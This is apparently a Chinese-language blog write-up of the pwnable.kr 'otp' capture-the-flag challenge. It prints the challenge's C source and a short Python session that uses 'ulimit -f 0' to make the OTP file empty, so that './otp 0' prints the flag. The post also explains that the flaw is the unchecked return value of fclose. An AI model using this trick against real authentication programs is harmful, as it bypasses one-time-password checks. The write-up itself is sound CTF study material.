---
title: pwnable.kr-otp
date: 2018-02-26 10:56:31
tags: [pwnable.kr,PWN]
categories: CTF
---
# 前言
开始一直在找溢出点哈哈，最后实在没有头绪看了别人的[writeup](http://blog.csdn.net/z231288/article/details/65512472)
# 分析
先分析源码`otp.c`
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>

int main(int argc, char* argv[]){
	char fname[128];
	unsigned long long otp[2];

	if(argc!=2){
		printf("usage : ./otp [passcode]\n");
		return 0;
	}

	int fd = open("/dev/urandom", O_RDONLY);
	if(fd==-1) exit(-1);

	if(read(fd, otp, 16)!=16) exit(-1);
	close(fd);

	sprintf(fname, "/tmp/%llu", otp[0]);
	FILE* fp = fopen(fname, "w");
	if(fp==NULL){ exit(-1); }
	fwrite(&otp[1], 8, 1, fp);
	fclose(fp);

	printf("OTP generated.\n");

	unsigned long long passcode=0;
	FILE* fp2 = fopen(fname, "r");
	if(fp2==NULL){ exit(-1); }
	fread(&passcode, 8, 1, fp2);
	fclose(fp2);
	
	if(strtoul(argv[1], 0, 16) == passcode){
		printf("Congratz!\n");
		system("/bin/cat flag");
	}
	else{
		printf("OTP mismatch\n");
	}

	unlink(fname);
	return 0;
}
	


```
程序从`/dev/urandow`伪随机设备里读出16个字节，前8个字节用作文件名后8字节存在该文件里，最后会从文件中读出8字节与传入的参数做比较，相等就能getflag。
开始找溢出点半天也没找到，题目也说了不能爆破所以是一点头绪也没有。后来看了别人的writeup后真是郁闷，原来题目平台还能使用`ulimit`命令，该命令的介绍百度就有很多。这里使用`ulimit -f 0`来限制进程创建文件的大小为0,这样程序在执行`fclose`的时候缓冲区的内容就无法写入文件，那么最后读出来的就是0了。
于是exp就出来了，直接在题目平台上搞
```bash
otp@ubuntu:~$ ulimit -f 0
otp@ubuntu:~$ python
Python 2.7.12 (default, Jul  1 2016, 15:12:24) 
[GCC 5.4.0 20160609] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> import os
>>> os.system('ls')
flag  otp  otp.c
0
>>> os.system('./otp 0')
OTP generated.
Congratz!
Darn... I always forget to check the return value of fclose() :(
0
>>> 

```
要注意的是，不能直接在shell里搞，因为这样shell直接会返回异常。
# 总结
这道题目的漏洞有内因和外因，内因就像flag中说的没有对`fclose`的返回值检查，导致可能写入文件失败。外因就是`ulimit`命令了，没有限制普通用户对它的使用。